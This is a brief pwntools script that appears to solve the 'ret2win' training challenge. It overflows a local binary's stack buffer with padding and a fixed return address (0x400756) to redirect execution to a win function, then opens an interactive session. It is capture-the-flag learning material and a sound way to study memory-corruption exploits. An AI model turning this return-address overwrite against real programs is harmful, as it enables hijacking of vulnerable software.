from pwn import * 
from pwn import p64
import socket

context(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
r = process("./ret2win")
payload = b'A'*0x20 + b"junkjunk" + p64(0x00400756)
r.sendlineafter(b">",payload)
r.interactive()

